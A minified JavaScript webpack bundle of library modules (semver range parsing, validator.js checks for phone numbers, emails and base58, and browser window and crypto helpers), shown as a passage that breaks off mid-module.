/*! For license information please see main.fa825785.js.LICENSE.txt */
( () => {
    var e = {
        18: (e, t, r) => {
            const n = r(4950);
            e.exports = (e, t, r) => n(e, t, r) <= 0
        }
        ,
        28: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                (0,
                n.default)(e);
                var r = t ? "\\x00-\\x09\\x0B\\x0C\\x0E-\\x1F\\x7F" : "\\x00-\\x1F\\x7F";
                return (0,
                o.default)(e, r)
            }
            ;
            var n = i(r(8804))
              , o = i(r(6061));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        33: (e, t) => {
            "use strict";
            function r(e) {
                let t;
                return "undefined" !== typeof window && "undefined" !== typeof window[e] && (t = window[e]),
                t
            }
            function n(e) {
                const t = r(e);
                if (!t)
                    throw new Error("".concat(e, " is not defined in Window"));
                return t
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.getLocalStorage = t.getLocalStorageOrThrow = t.getCrypto = t.getCryptoOrThrow = t.getLocation = t.getLocationOrThrow = t.getNavigator = t.getNavigatorOrThrow = t.getDocument = t.getDocumentOrThrow = t.getFromWindowOrThrow = t.getFromWindow = void 0,
            t.getFromWindow = r,
            t.getFromWindowOrThrow = n,
            t.getDocumentOrThrow = function() {
                return n("document")
            }
            ,
            t.getDocument = function() {
                return r("document")
            }
            ,
            t.getNavigatorOrThrow = function() {
                return n("navigator")
            }
            ,
            t.getNavigator = function() {
                return r("navigator")
            }
            ,
            t.getLocationOrThrow = function() {
                return n("location")
            }
            ,
            t.getLocation = function() {
                return r("location")
            }
            ,
            t.getCryptoOrThrow = function() {
                return n("crypto")
            }
            ,
            t.getCrypto = function() {
                return r("crypto")
            }
            ,
            t.getLocalStorageOrThrow = function() {
                return n("localStorage")
            }
            ,
            t.getLocalStorage = function() {
                return r("localStorage")
            }
        }
        ,
        77: (e, t, r) => {
            const n = /\s+/g;
            class o {
                constructor(e, t) {
                    if (t = s(t),
                    e instanceof o)
                        return e.loose === !!t.loose && e.includePrerelease === !!t.includePrerelease ? e : new o(e.raw,t);
                    if (e instanceof a)
                        return this.raw = e.value,
                        this.set = [[e]],
                        this.formatted = void 0,
                        this;
                    if (this.options = t,
                    this.loose = !!t.loose,
                    this.includePrerelease = !!t.includePrerelease,
                    this.raw = e.trim().replace(n, " "),
                    this.set = this.raw.split("||").map((e => this.parseRange(e.trim()))).filter((e => e.length)),
                    !this.set.length)
                        throw new TypeError("Invalid SemVer Range: ".concat(this.raw));
                    if (this.set.length > 1) {
                        const e = this.set[0];
                        if (this.set = this.set.filter((e => !m(e[0]))),
                        0 === this.set.length)
                            this.set = [e];
                        else if (this.set.length > 1)
                            for (const t of this.set)
                                if (1 === t.length && b(t[0])) {
                                    this.set = [t];
                                    break
                                }
                    }
                    this.formatted = void 0
                }
                get range() {
                    if (void 0 === this.formatted) {
                        this.formatted = "";
                        for (let e = 0; e < this.set.length; e++) {
                            e > 0 && (this.formatted += "||");
                            const t = this.set[e];
                            for (let e = 0; e < t.length; e++)
                                e > 0 && (this.formatted += " "),
                                this.formatted += t[e].toString().trim()
                        }
                    }
                    return this.formatted
                }
                format() {
                    return this.range
                }
                toString() {
                    return this.range
                }
                parseRange(e) {
                    const t = ((this.options.includePrerelease && g) | (this.options.loose && y)) + ":" + e
                      , r = i.get(t);
                    if (r)
                        return r;
                    const n = this.options.loose
                      , o = n ? u[d.HYPHENRANGELOOSE] : u[d.HYPHENRANGE];
                    e = e.replace(o, O(this.options.includePrerelease)),
                    c("hyphen replace", e),
                    e = e.replace(u[d.COMPARATORTRIM], h),
                    c("comparator trim", e),
                    e = e.replace(u[d.TILDETRIM], f),
                    c("tilde trim", e),
                    e = e.replace(u[d.CARETTRIM], p),
                    c("caret trim", e);
                    let s = e.split(" ").map((e => w(e, this.options))).join(" ").split(/\s+/).map((e => x(e, this.options)));
                    n && (s = s.filter((e => (c("loose invalid filter", e, this.options),
                    !!e.match(u[d.COMPARATORLOOSE]))))),
                    c("range list", s);
                    const l = new Map
                      , b = s.map((e => new a(e,this.options)));
                    for (const i of b) {
                        if (m(i))
                            return [i];
                        l.set(i.value, i)
                    }
                    l.size > 1 && l.has("") && l.delete("");
                    const v = [...l.values()];
                    return i.set(t, v),
                    v
                }
                intersects(e, t) {
                    if (!(e instanceof o))
                        throw new TypeError("a Range is required");
                    return this.set.some((r => v(r, t) && e.set.some((e => v(e, t) && r.every((r => e.every((e => r.intersects(e, t)))))))))
                }
                test(e) {
                    if (!e)
                        return !1;
                    if ("string" === typeof e)
                        try {
                            e = new l(e,this.options)
                        } catch (t) {
                            return !1
                        }
                    for (let r = 0; r < this.set.length; r++)
                        if (_(this.set[r], e, this.options))
                            return !0;
                    return !1
                }
            }
            e.exports = o;
            const i = new (r(4068))
              , s = r(5525)
              , a = r(4426)
              , c = r(3338)
              , l = r(9398)
              , {safeRe: u, t: d, comparatorTrimReplace: h, tildeTrimReplace: f, caretTrimReplace: p} = r(9040)
              , {FLAG_INCLUDE_PRERELEASE: g, FLAG_LOOSE: y} = r(5132)
              , m = e => "<0.0.0-0" === e.value
              , b = e => "" === e.value
              , v = (e, t) => {
                let r = !0;
                const n = e.slice();
                let o = n.pop();
                for (; r && n.length; )
                    r = n.every((e => o.intersects(e, t))),
                    o = n.pop();
                return r
            }
              , w = (e, t) => (c("comp", e, t),
            e = P(e, t),
            c("caret", e),
            e = A(e, t),
            c("tildes", e),
            e = S(e, t),
            c("xrange", e),
            e = B(e, t),
            c("stars", e),
            e)
              , T = e => !e || "x" === e.toLowerCase() || "*" === e
              , A = (e, t) => e.trim().split(/\s+/).map((e => E(e, t))).join(" ")
              , E = (e, t) => {
                const r = t.loose ? u[d.TILDELOOSE] : u[d.TILDE];
                return e.replace(r, ( (t, r, n, o, i) => {
                    let s;
                    return c("tilde", e, t, r, n, o, i),
                    T(r) ? s = "" : T(n) ? s = ">=".concat(r, ".0.0 <").concat(+r + 1, ".0.0-0") : T(o) ? s = ">=".concat(r, ".").concat(n, ".0 <").concat(r, ".").concat(+n + 1, ".0-0") : i ? (c("replaceTilde pr", i),
                    s = ">=".concat(r, ".").concat(n, ".").concat(o, "-").concat(i, " <").concat(r, ".").concat(+n + 1, ".0-0")) : s = ">=".concat(r, ".").concat(n, ".").concat(o, " <").concat(r, ".").concat(+n + 1, ".0-0"),
                    c("tilde return", s),
                    s
                }
                ))
            }
              , P = (e, t) => e.trim().split(/\s+/).map((e => C(e, t))).join(" ")
              , C = (e, t) => {
                c("caret", e, t);
                const r = t.loose ? u[d.CARETLOOSE] : u[d.CARET]
                  , n = t.includePrerelease ? "-0" : "";
                return e.replace(r, ( (t, r, o, i, s) => {
                    let a;
                    return c("caret", e, t, r, o, i, s),
                    T(r) ? a = "" : T(o) ? a = ">=".concat(r, ".0.0").concat(n, " <").concat(+r + 1, ".0.0-0") : T(i) ? a = "0" === r ? ">=".concat(r, ".").concat(o, ".0").concat(n, " <").concat(r, ".").concat(+o + 1, ".0-0") : ">=".concat(r, ".").concat(o, ".0").concat(n, " <").concat(+r + 1, ".0.0-0") : s ? (c("replaceCaret pr", s),
                    a = "0" === r ? "0" === o ? ">=".concat(r, ".").concat(o, ".").concat(i, "-").concat(s, " <").concat(r, ".").concat(o, ".").concat(+i + 1, "-0") : ">=".concat(r, ".").concat(o, ".").concat(i, "-").concat(s, " <").concat(r, ".").concat(+o + 1, ".0-0") : ">=".concat(r, ".").concat(o, ".").concat(i, "-").concat(s, " <").concat(+r + 1, ".0.0-0")) : (c("no pr"),
                    a = "0" === r ? "0" === o ? ">=".concat(r, ".").concat(o, ".").concat(i).concat(n, " <").concat(r, ".").concat(o, ".").concat(+i + 1, "-0") : ">=".concat(r, ".").concat(o, ".").concat(i).concat(n, " <").concat(r, ".").concat(+o + 1, ".0-0") : ">=".concat(r, ".").concat(o, ".").concat(i, " <").concat(+r + 1, ".0.0-0")),
                    c("caret return", a),
                    a
                }
                ))
            }
              , S = (e, t) => (c("replaceXRanges", e, t),
            e.split(/\s+/).map((e => I(e, t))).join(" "))
              , I = (e, t) => {
                e = e.trim();
                const r = t.loose ? u[d.XRANGELOOSE] : u[d.XRANGE];
                return e.replace(r, ( (r, n, o, i, s, a) => {
                    c("xRange", e, r, n, o, i, s, a);
                    const l = T(o)
                      , u = l || T(i)
                      , d = u || T(s)
                      , h = d;
                    return "=" === n && h && (n = ""),
                    a = t.includePrerelease ? "-0" : "",
                    l ? r = ">" === n || "<" === n ? "<0.0.0-0" : "*" : n && h ? (u && (i = 0),
                    s = 0,
                    ">" === n ? (n = ">=",
                    u ? (o = +o + 1,
                    i = 0,
                    s = 0) : (i = +i + 1,
                    s = 0)) : "<=" === n && (n = "<",
                    u ? o = +o + 1 : i = +i + 1),
                    "<" === n && (a = "-0"),
                    r = "".concat(n + o, ".").concat(i, ".").concat(s).concat(a)) : u ? r = ">=".concat(o, ".0.0").concat(a, " <").concat(+o + 1, ".0.0-0") : d && (r = ">=".concat(o, ".").concat(i, ".0").concat(a, " <").concat(o, ".").concat(+i + 1, ".0-0")),
                    c("xRange return", r),
                    r
                }
                ))
            }
              , B = (e, t) => (c("replaceStars", e, t),
            e.trim().replace(u[d.STAR], ""))
              , x = (e, t) => (c("replaceGTE0", e, t),
            e.trim().replace(u[t.includePrerelease ? d.GTE0PRE : d.GTE0], ""))
              , O = e => (t, r, n, o, i, s, a, c, l, u, d, h) => (r = T(n) ? "" : T(o) ? ">=".concat(n, ".0.0").concat(e ? "-0" : "") : T(i) ? ">=".concat(n, ".").concat(o, ".0").concat(e ? "-0" : "") : s ? ">=".concat(r) : ">=".concat(r).concat(e ? "-0" : ""),
            c = T(l) ? "" : T(u) ? "<".concat(+l + 1, ".0.0-0") : T(d) ? "<".concat(l, ".").concat(+u + 1, ".0-0") : h ? "<=".concat(l, ".").concat(u, ".").concat(d, "-").concat(h) : e ? "<".concat(l, ".").concat(u, ".").concat(+d + 1, "-0") : "<=".concat(c),
            "".concat(r, " ").concat(c).trim())
              , _ = (e, t, r) => {
                for (let n = 0; n < e.length; n++)
                    if (!e[n].test(t))
                        return !1;
                if (t.prerelease.length && !r.includePrerelease) {
                    for (let r = 0; r < e.length; r++)
                        if (c(e[r].semver),
                        e[r].semver !== a.ANY && e[r].semver.prerelease.length > 0) {
                            const n = e[r].semver;
                            if (n.major === t.major && n.minor === t.minor && n.patch === t.patch)
                                return !0
                        }
                    return !1
                }
                return !0
            }
        }
        ,
        88: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                if ((0,
                o.default)(e),
                i.test(e))
                    return !0;
                return !1
            }
            ;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = /^[A-HJ-NP-Za-km-z1-9]*$/;
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        164: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t, r) {
                if ((0,
                o.default)(e),
                r && r.strictMode && !e.startsWith("+"))
                    return !1;
                if (Array.isArray(t))
                    return t.some((function(t) {
                        if (i.hasOwnProperty(t) && i[t].test(e))
                            return !0;
                        return !1
                    }
                    ));
                if (t in i)
                    return i[t].test(e);
                if (!t || "any" === t) {
                    for (var n in i) {
                        if (i.hasOwnProperty(n))
                            if (i[n].test(e))
                                return !0
                    }
                    return !1
                }
                throw new Error("Invalid locale '".concat(t, "'"))
            }
            ,
            t.locales = void 0;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = {
                "am-AM": /^(\+?374|0)(33|4[134]|55|77|88|9[13-689])\d{6}$/,
                "ar-AE": /^((\+?971)|0)?5[024568]\d{7}$/,
                "ar-BH": /^(\+?973)?(3|6)\d{7}$/,
                "ar-DZ": /^(\+?213|0)(5|6|7)\d{8}$/,
                "ar-LB": /^(\+?961)?((3|81)\d{6}|7\d{7})$/,
                "ar-EG": /^((\+?20)|0)?1[0125]\d{8}$/,
                "ar-IQ": /^(\+?964|0)?7[0-9]\d{8}$/,
                "ar-JO": /^(\+?962|0)?7[789]\d{7}$/,
                "ar-KW": /^(\+?965)([569]\d{7}|41\d{6})$/,
                "ar-LY": /^((\+?218)|0)?(9[1-6]\d{7}|[1-8]\d{7,9})$/,
                "ar-MA": /^(?:(?:\+|00)212|0)[5-7]\d{8}$/,
                "ar-OM": /^((\+|00)968)?(9[1-9])\d{6}$/,
                "ar-PS": /^(\+?970|0)5[6|9](\d{7})$/,
                "ar-SA": /^(!?(\+?966)|0)?5\d{8}$/,
                "ar-SD": /^((\+?249)|0)?(9[012369]|1[012])\d{7}$/,
                "ar-SY": /^(!?(\+?963)|0)?9\d{8}$/,
                "ar-TN": /^(\+?216)?[2459]\d{7}$/,
                "az-AZ": /^(\+994|0)(10|5[015]|7[07]|99)\d{7}$/,
                "bs-BA": /^((((\+|00)3876)|06))((([0-3]|[5-6])\d{6})|(4\d{7}))$/,
                "be-BY": /^(\+?375)?(24|25|29|33|44)\d{7}$/,
                "bg-BG": /^(\+?359|0)?8[789]\d{7}$/,
                "bn-BD": /^(\+?880|0)1[13456789][0-9]{8}$/,
                "ca-AD": /^(\+376)?[346]\d{5}$/,
                "cs-CZ": /^(\+?420)? ?[1-9][0-9]{2} ?[0-9]{3} ?[0-9]{3}$/,
                "da-DK": /^(\+?45)?\s?\d{2}\s?\d{2}\s?\d{2}\s?\d{2}$/,
                "de-DE": /^((\+49|0)1)(5[0-25-9]\d|6([23]|0\d?)|7([0-57-9]|6\d))\d{7,9}$/,
                "de-AT": /^(\+43|0)\d{1,4}\d{3,12}$/,
                "de-CH": /^(\+41|0)([1-9])\d{1,9}$/,
                "de-LU": /^(\+352)?((6\d1)\d{6})$/,
                "dv-MV": /^(\+?960)?(7[2-9]|9[1-9])\d{5}$/,
                "el-GR": /^(\+?30|0)?6(8[5-9]|9(?![26])[0-9])\d{7}$/,
                "el-CY": /^(\+?357?)?(9(9|6)\d{6})$/,
                "en-AI": /^(\+?1|0)264(?:2(35|92)|4(?:6[1-2]|76|97)|5(?:3[6-9]|8[1-4])|7(?:2(4|9)|72))\d{4}$/,
                "en-AU": /^(\+?61|0)4\d{8}$/,
                "en-AG": /^(?:\+1|1)268(?:464|7(?:1[3-9]|[28]\d|3[0246]|64|7[0-689]))\d{4}$/,
                "en-BM": /^(\+?1)?441(((3|7)\d{6}$)|(5[0-3][0-9]\d{4}$)|(59\d{5}$))/,
                "en-BS": /^(\+?1[-\s]?|0)?\(?242\)?[-\s]?\d{3}[-\s]?\d{4}$/,
                "en-GB": /^(\+?44|0)7\d{9}$/,
                "en-GG": /^(\+?44|0)1481\d{6}$/,
                "en-GH": /^(\+233|0)(20|50|24|54|27|57|26|56|23|28|55|59)\d{7}$/,
                "en-GY": /^(\+592|0)6\d{6}$/,
                "en-HK": /^(\+?852[-\s]?)?[456789]\d{3}[-\s]?\d{4}$/,
                "en-MO": /^(\+?853[-\s]?)?[6]\d{3}[-\s]?\d{4}$/,
                "en-IE": /^(\+?353|0)8[356789]\d{7}$/,
                "en-IN": /^(\+?91|0)?[6789]\d{9}$/,
                "en-JM": /^(\+?876)?\d{7}$/,
                "en-KE": /^(\+?254|0)(7|1)\d{8}$/,
                "fr-CF": /^(\+?236| ?)(70|75|77|72|21|22)\d{6}$/,
                "en-SS": /^(\+?211|0)(9[1257])\d{7}$/,
                "en-KI": /^((\+686|686)?)?( )?((6|7)(2|3|8)[0-9]{6})$/,
                "en-KN": /^(?:\+1|1)869(?:46\d|48[89]|55[6-8]|66\d|76[02-7])\d{4}$/,
                "en-LS": /^(\+?266)(22|28|57|58|59|27|52)\d{6}$/,
                "en-MT": /^(\+?356|0)?(99|79|77|21|27|22|25)[0-9]{6}$/,
                "en-MU": /^(\+?230|0)?\d{8}$/,
                "en-MW": /^(\+?265|0)(((77|88|31|99|98|21)\d{7})|(((111)|1)\d{6})|(32000\d{4}))$/,
                "en-NA": /^(\+?264|0)(6|8)\d{7}$/,
                "en-NG": /^(\+?234|0)?[789]\d{9}$/,
                "en-NZ": /^(\+?64|0)[28]\d{7,9}$/,
                "en-PG": /^(\+?675|0)?(7\d|8[18])\d{6}$/,
                "en-PK": /^((00|\+)?92|0)3[0-6]\d{8}$/,
                "en-PH": /^(09|\+639)\d{9}$/,
                "en-RW": /^(\+?250|0)?[7]\d{8}$/,
                "en-SG": /^(\+65)?[3689]\d{7}$/,
                "en-SL": /^(\+?232|0)\d{8}$/,
                "en-TZ": /^(\+?255|0)?[67]\d{8}$/,
                "en-UG": /^(\+?256|0)?[7]\d{8}$/,
                "en-US": /^((\+1|1)?( |-)?)?(\([2-9][0-9]{2}\)|[2-9][0-9]{2})( |-)?([2-9][0-9]{2}( |-)?[0-9]{4})$/,
                "en-ZA": /^(\+?27|0)\d{9}$/,
                "en-ZM": /^(\+?26)?09[567]\d{7}$/,
                "en-ZW": /^(\+263)[0-9]{9}$/,
                "en-BW": /^(\+?267)?(7[1-8]{1})\d{6}$/,
                "es-AR": /^\+?549(11|[2368]\d)\d{8}$/,
                "es-BO": /^(\+?591)?(6|7)\d{7}$/,
                "es-CO": /^(\+?57)?3(0(0|1|2|4|5)|1\d|2[0-4]|5(0|1))\d{7}$/,
                "es-CL": /^(\+?56|0)[2-9]\d{1}\d{7}$/,
                "es-CR": /^(\+506)?[2-8]\d{7}$/,
                "es-CU": /^(\+53|0053)?5\d{7}$/,
                "es-DO": /^(\+?1)?8[024]9\d{7}$/,
                "es-HN": /^(\+?504)?[9|8|3|2]\d{7}$/,
                "es-EC": /^(\+?593|0)([2-7]|9[2-9])\d{7}$/,
                "es-ES": /^(\+?34)?[6|7]\d{8}$/,
                "es-PE": /^(\+?51)?9\d{8}$/,
                "es-MX": /^(\+?52)?(1|01)?\d{10,11}$/,
                "es-NI": /^(\+?505)\d{7,8}$/,
                "es-PA": /^(\+?507)\d{7,8}$/,
                "es-PY": /^(\+?595|0)9[9876]\d{7}$/,
                "es-SV": /^(\+?503)?[67]\d{7}$/,
                "es-UY": /^(\+598|0)9[1-9][\d]{6}$/,
                "es-VE": /^(\+?58)?(2|4)\d{9}$/,
                "et-EE": /^(\+?372)?\s?(5|8[1-4])\s?([0-9]\s?){6,7}$/,
                "fa-IR": /^(\+?98[\-\s]?|0)9[0-39]\d[\-\s]?\d{3}[\-\s]?\d{4}$/,
                "fi-FI": /^(\+?358|0)\s?(4[0-6]|50)\s?(\d\s?){4,8}$/,
                "fj-FJ": /^(\+?679)?\s?\d{3}\s?\d{4}$/,
                "fo-FO": /^(\+?298)?\s?\d{2}\s?\d{2}\s?\d{2}$/,
                "fr-BF": /^(\+226|0)[67]\d{7}$/,
                "fr-BJ": /^(\+229)\d{8}$/,
                "fr-CD": /^(\+?243|0)?(8|9)\d{8}$/,
                "fr-CM": /^(\+?237)6[0-9]{8}$/,
                "fr-FR": /^(\+?33|0)[67]\d{8}$/,
                "fr-GF": /^(\+?594|0|00594)[67]\d{8}$/,
                "fr-GP": /^(\+?590|0|00590)[67]\d{8}$/,
                "fr-MQ": /^(\+?596|0|00596)[67]\d{8}$/,
                "fr-PF": /^(\+?689)?8[789]\d{6}$/,
                "fr-RE": /^(\+?262|0|00262)[67]\d{8}$/,
                "fr-WF": /^(\+681)?\d{6}$/,
                "he-IL": /^(\+972|0)([23489]|5[012345689]|77)[1-9]\d{6}$/,
                "hu-HU": /^(\+?36|06)(20|30|31|50|70)\d{7}$/,
                "id-ID": /^(\+?62|0)8(1[123456789]|2[1238]|3[1238]|5[12356789]|7[78]|9[56789]|8[123456789])([\s?|\d]{5,11})$/,
                "ir-IR": /^(\+98|0)?9\d{9}$/,
                "it-IT": /^(\+?39)?\s?3\d{2} ?\d{6,7}$/,
                "it-SM": /^((\+378)|(0549)|(\+390549)|(\+3780549))?6\d{5,9}$/,
                "ja-JP": /^(\+81[ \-]?(\(0\))?|0)[6789]0[ \-]?\d{4}[ \-]?\d{4}$/,
                "ka-GE": /^(\+?995)?(79\d{7}|5\d{8})$/,
                "kk-KZ": /^(\+?7|8)?7\d{9}$/,
                "kl-GL": /^(\+?299)?\s?\d{2}\s?\d{2}\s?\d{2}$/,
                "ko-KR": /^((\+?82)[ \-]?)?0?1([0|1|6|7|8|9]{1})[ \-]?\d{3,4}[ \-]?\d{4}$/,
                "ky-KG": /^(\+?7\s?\+?7|0)\s?\d{2}\s?\d{3}\s?\d{4}$/,
                "lt-LT": /^(\+370|8)\d{8}$/,
                "lv-LV": /^(\+?371)2\d{7}$/,
                "mg-MG": /^((\+?261|0)(2|3)\d)?\d{7}$/,
                "mn-MN": /^(\+|00|011)?976(77|81|88|91|94|95|96|99)\d{6}$/,
                "my-MM": /^(\+?959|09|9)(2[5-7]|3[1-2]|4[0-5]|6[6-9]|7[5-9]|9[6-9])[0-9]{7}$/,
                "ms-MY": /^(\+?60|0)1(([0145](-|\s)?\d{7,8})|([236-9](-|\s)?\d{7}))$/,
                "mz-MZ": /^(\+?258)?8[234567]\d{7}$/,
                "nb-NO": /^(\+?47)?[49]\d{7}$/,
                "ne-NP": /^(\+?977)?9[78]\d{8}$/,
                "nl-BE": /^(\+?32|0)4\d{8}$/,
                "nl-NL": /^(((\+|00)?31\(0\))|((\+|00)?31)|0)6{1}\d{8}$/,
                "nl-AW": /^(\+)?297(56|59|64|73|74|99)\d{5}$/,
                "nn-NO": /^(\+?47)?[49]\d{7}$/,
                "pl-PL": /^(\+?48)? ?([5-8]\d|45) ?\d{3} ?\d{2} ?\d{2}$/,
                "pt-BR": /^((\+?55\ ?[1-9]{2}\ ?)|(\+?55\ ?\([1-9]{2}\)\ ?)|(0[1-9]{2}\ ?)|(\([1-9]{2}\)\ ?)|([1-9]{2}\ ?))((\d{4}\-?\d{4})|(9[1-9]{1}\d{3}\-?\d{4}))$/,
                "pt-PT": /^(\+?351)?9[1236]\d{7}$/,
                "pt-AO": /^(\+244)\d{9}$/,
                "ro-MD": /^(\+?373|0)((6(0|1|2|6|7|8|9))|(7(6|7|8|9)))\d{6}$/,
                "ro-RO": /^(\+?40|0)\s?7\d{2}(\/|\s|\.|-)?\d{3}(\s|\.|-)?\d{3}$/,
                "ru-RU": /^(\+?7|8)?9\d{9}$/,
                "si-LK": /^(?:0|94|\+94)?(7(0|1|2|4|5|6|7|8)( |-)?)\d{7}$/,
                "sl-SI": /^(\+386\s?|0)(\d{1}\s?\d{3}\s?\d{2}\s?\d{2}|\d{2}\s?\d{3}\s?\d{3})$/,
                "sk-SK": /^(\+?421)? ?[1-9][0-9]{2} ?[0-9]{3} ?[0-9]{3}$/,
                "so-SO": /^(\+?252|0)((6[0-9])\d{7}|(7[1-9])\d{7})$/,
                "sq-AL": /^(\+355|0)6[789]\d{6}$/,
                "sr-RS": /^(\+3816|06)[- \d]{5,9}$/,
                "sv-SE": /^(\+?46|0)[\s\-]?7[\s\-]?[02369]([\s\-]?\d){7}$/,
                "tg-TJ": /^(\+?992)?[5][5]\d{7}$/,
                "th-TH": /^(\+66|66|0)\d{9}$/,
                "tr-TR": /^(\+?90|0)?5\d{9}$/,
                "tk-TM": /^(\+993|993|8)\d{8}$/,
                "uk-UA": /^(\+?38|8)?0\d{9}$/,
                "uz-UZ": /^(\+?998)?(6[125-79]|7[1-69]|88|9\d)\d{7}$/,
                "vi-VN": /^((\+?84)|0)((3([2-9]))|(5([25689]))|(7([0|6-9]))|(8([1-9]))|(9([0-9])))([0-9]{7})$/,
                "zh-CN": /^((\+|00)86)?(1[3-9]|9[28])\d{9}$/,
                "zh-TW": /^(\+?886\-?|0)?9\d{8}$/,
                "dz-BT": /^(\+?975|0)?(17|16|77|02)\d{6}$/,
                "ar-YE": /^(((\+|00)9677|0?7)[0137]\d{7}|((\+|00)967|0)[1-7]\d{6})$/,
                "ar-EH": /^(\+?212|0)[\s\-]?(5288|5289)[\s\-]?\d{5}$/,
                "fa-AF": /^(\+93|0)?(2{1}[0-8]{1}|[3-5]{1}[0-4]{1})(\d{7})$/
            };
            i["en-CA"] = i["en-US"],
            i["fr-CA"] = i["en-CA"],
            i["fr-BE"] = i["nl-BE"],
            i["zh-HK"] = i["en-HK"],
            i["zh-MO"] = i["en-MO"],
            i["ga-IE"] = i["en-IE"],
            i["fr-CH"] = i["de-CH"],
            i["it-CH"] = i["fr-CH"];
            t.locales = Object.keys(i)
        }
        ,
        196: (e, t, r) => {
            const n = r(77);
            e.exports = (e, t) => {
                try {
                    return new n(e,t).range || "*"
                } catch (r) {
                    return null
                }
            }
        }
        ,
        295: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e) ? parseFloat(e) : NaN
            }
            ;
            var n, o = (n = r(5972)) && n.__esModule ? n : {
                default: n
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        296: (e, t) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.delay = void 0,
            t.delay = function(e) {
                return new Promise((t => {
                    setTimeout(( () => {
                        t(!0)
                    }
                    ), e)
                }
                ))
            }
        }
        ,
        364: (e, t, r) => {
            "use strict";
            function n() {
                return (null === r.g || void 0 === r.g ? void 0 : r.g.crypto) || (null === r.g || void 0 === r.g ? void 0 : r.g.msCrypto) || {}
            }
            function o() {
                const e = n();
                return e.subtle || e.webkitSubtle
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.isBrowserCryptoAvailable = t.getSubtleCrypto = t.getBrowerCrypto = void 0,
            t.getBrowerCrypto = n,
            t.getSubtleCrypto = o,
            t.isBrowserCryptoAvailable = function() {
                return !!n() && !!o()
            }
        }
        ,
        407: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                return (0,
                n.default)(e),
                0 === ((t = (0,
                o.default)(t, s)).ignore_whitespace ? e.trim().length : e.length)
            }
            ;
            var n = i(r(8804))
              , o = i(r(3975));
            function i(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var s = {
                ignore_whitespace: !1
            };
            e.exports = t.default,
            e.exports.default = t.default
        }
        ,
        477: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e) {
                return (0,
                o.default)(e),
                i.test(e)
            }
            ,
            t.halfWidth = void 0;
            var n, o = (n = r(8804)) && n.__esModule ? n : {
                default: n
            };
            var i = t.halfWidth = /[\u0020-\u007E\uFF61-\uFF9F\uFFA0-\uFFDC\uFFE8-\uFFEE0-9a-zA-Z]/
        }
        ,
        498: (e, t, r) => {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }),
            t.default = function(e, t) {
                if ((0,
                n.default)(e),
                (t = (0,
                a.default)(t, l)).require_display_name || t.allow_display_name) {
                    var r = e.match(u);
                    if (r) {
                        var c = r[1];
                        if (e = e.replace(c, "").replace(/(^<|>$)/g, ""),
                        c.endsWith(" ") && (c = c.slice(0, -1)),
                        !function(e) {
                            var t = e.replace(/^"(.+)"$/, "$1");
                            if (!t.trim())
                                return !1;
                            if (/[\.";<>]/.test(t)) {
                                if (t === e)
                                    return !1;
                                if (!(t.split('"').length === t.split('\\"').length))
                                    return !1
                            }
                            return !0
                        }(c))
                            return !1
                    } else if (t.require_display_name)
                        return !1
                }
                if (!t.ignore_max_length && e.length > y)
                    return !1;
                var m = e.split("@")
                  , b = m.pop()
                  , v = b.toLowerCase();
                if (t.host_blacklist.includes(v))
                    return !1;
                if (t.host_whitelist.length > 0 && !t.host_whitelist.includes(v))
                    return !1;
                var w = m.join("@");
                if (t.domain_specific_validation && ("gmail.com" === v || "googlemail.com" === v)) {
                    var T = (w = w.toLowerCase()).split("+")[0];
                    if (!(0,
                    o.default)(T.replace(/\./g, ""), {
                        min: 6,
                        max: 30
                    }))
                        return !1;
                    for (var A = T.split("."), E = 0; E < A.length; E++)
                        if (!h.test(A[E]))
                            return !1
                }
                if (!1 === t.ignore_max_length && (!(0,
                o.default)(w, {
                    max: 64
                }) || !(0,
                o.default)(b, {
                    max: 254
                })))
                    return !1;
                if (!(0,
                i.default)(b, {
                    require_tld: t.require_tld,
                    ignore_max_length: t.ignore_max_length,
                    allow_underscores: t.allow_underscores
                })) {
                    if (!t.allow_ip_domain)
                        return !1;
                    if (!(0,
                    s.default)(b)) {
                        if (!b.startsWith("[") || !b.endsWith("]"))
                            return !1;
                        var P = b.slice(1, -1);
                        if (0 === P.length || !(0,
                        s.default)(P))
                            return !1
                    }
                }
                if ('"' === w[0])
                    return w = w.slice(1, w.length - 1),
                    t.allow_utf8_local_part ? g.test(w) : f.test(w);
                for (var C = t.allow_utf8_local_part ? p : d, S = w.split("."), I = 0; I < S.length; I++)
                    if (!C.test(S[I]))
                        return !1;
                if (t.blacklisted_chars && -1 !== w.search(new RegExp("[".concat(t.blacklisted_chars, "]+"),"g")))
                    return !1;
                return !0
            }
            ;
            var n = c(r(8804))
              , o = c(r(3298))
              , i = c(r(7891))
              , s = c(r(6581))
              , a = c(r(3975));
            function c(e) {
                return e && e.__esModule ? e : {
                    default: e
                }
            }
            var l = {
                allow_display_name: !1,
                allow_underscores: !1,
                require_display_name: !1,
                allow_utf8_local_part: !0,
                require_tld: !0,
                blacklisted_chars: "",
                ignore_max_length: !1,
                host_blacklist: [],
                host_whitelist: []
            }
              , u = /^([^\x00-\x1F\x7F-\x9F\cX]+)</i
              , d = /^[a-z\d!#\$%&'\*\+\-\/=\?\^_`{\|}~]+$/i
              , h = /^[a-z\d]+$/
